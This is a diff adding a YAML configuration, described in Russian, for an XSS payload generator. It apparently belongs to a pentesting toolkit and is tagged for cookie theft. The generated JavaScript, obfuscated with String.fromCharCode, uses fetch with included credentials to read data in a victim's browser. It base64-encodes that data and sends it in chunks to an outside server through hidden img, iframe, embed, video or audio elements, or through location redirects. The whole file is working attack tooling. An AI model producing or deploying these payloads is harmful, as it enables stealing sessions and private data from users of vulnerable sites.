@@ -1,0 +1,150 @@
+description: >-
+  Генератор нагрузки для похищения информации с помощью fetch. Внедрять вместо alert(0).
+
+  Будет отправлять данные с помощью GET-запросов частями, если их много.
+  При эксплуатации с помощью location нужно настроить принимающий сервер на долгий ответ (60000), чтобы перенаправление не произошло до отправки всех данных. 
+author: vinzekatze
+tags:
+  - xss
+  - payload
+  - generator
+  - cookie
+
+arguments:
+  server-url:
+    default:
+    description: >-
+      URL 
+    replacer: '#server_url#'
+  
+  fetch-url:
+    default:
+    description: >-
+      URL 
+    replacer: '#fetch_url#'
+
+  o:
+    default: '{"credentials": "include","method": "GET","mode": "cors"}'
+    description: >-
+      URL отслеживающего сервера (например: 'http://pentester.site')
+    replacer: '#fetch_options#'
+
+  a:
+    default:
+      - img
+      - iframe
+      - embed
+      - video
+      - audio
+      - location
+    description: агент с помощью которого будет осуществляться запрос на отслеживающий сервер
+    replacer: '#agent#'
+  
+  d:
+    default: 500
+    description: время задержки смены location при отправке разных частей данных
+    replacer: '#delay#'
+    metavar: ms
+    regex: '\d+'
+
+  num-param:
+    default: number
+    description: GET-параметр,
+    metavar: PARAMETER
+    replacer: '#num-param#'
+
+  pld-param:
+    default: payload
+    description: GET-параметр, в котором будет отправляться похищенное в кодировке base64
+    metavar: PARAMETER
+    replacer: '#payload-param#'
+  
+  head:
+    default: 
+      - body
+      - head
+    description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
+    replacer: '#pos#'
+
+
+mode:
+  format:
+    fetch-url: '{0!r}'
+    server-url: '{0!r}'
+    o: '{0!r}'
+    num-param: '{0!r}'
+    pld-param: '{0!r}'
+    head: '{0!r}'
+
+  replace:
+    a:
+      img: |-
+        var attackElementStart = `<img src="${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = `" style="display:none">`;
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+
+      iframe: |-
+        var attackElementStart = `<iframe src="${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = `" style="display:none"></iframe>`;
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+      embed: |-
+        var attackElementStart = `<embed src="${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = `" style="display:none">`;
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+      video: |-
+        var attackElementStart = `<video src="${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = `"controls style="display:none"></video>`;
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+      audio: |-
+        var attackElementStart = `<audio src="${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = `"controls style="display:none"></audio>`;
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+      
+      location: |
+        var attackElementStart = `${serverURL}?${numParam}=`;
+        var attackElementMid = `&${payloadParam}=`;
+        var attackElementEnd = "";
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){setTimeout(function(){if(localStorage.getItem(${randomNumber})==null){localStorage.setItem(${randomNumber},0)}if(localStorage.getItem(${randomNumber})==i){{localStorage.setItem(${randomNumber},i-(-1))}window.location.replace(String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c))}},${locationDelay}*i)})})"
+shell: node
+script: |-
+  function MakeCharCode(pld) {
+    output_arr = [];
+    pld_arr = [...pld];
+    pld_arr.forEach((i) => {
+      output_arr.push(i.charCodeAt(0));
+    });
+    output = output_arr.join(",");
+    return output;
+  };
+  
+  var serverURL = #server_url#;
+  var fetchURL = #fetch_url#;
+  var fetchOptions = #fetch_options#;
+  var numParam = #num-param#;
+  var payloadParam = #payload-param#;
+  var position = #pos#;
+  var datablockRegex = '.{1,1500}';
+  var randomNumber = Math.round(Math.random()*1000)
+  var locationDelay = #delay#
+
+  // внедряемый элемент
+  #agent#
+
+  // Кодирование параметров
+  chars_fetchURL = MakeCharCode(fetchURL);
+  chars_fetchOptions = MakeCharCode(fetchOptions);
+  chars_datablockRegex = MakeCharCode(datablockRegex);
+
+  // Сборка полной нагрузки
+  chars_attackElementStart = MakeCharCode(attackElementStart);
+  chars_attackElementMid = MakeCharCode(attackElementMid);
+  chars_attackElementEnd = MakeCharCode(attackElementEnd);
+  chars_position = MakeCharCode("beforeend");
+  payload = eval(`\`${payloadTemplate}\``);
+
+  console.log(payload);
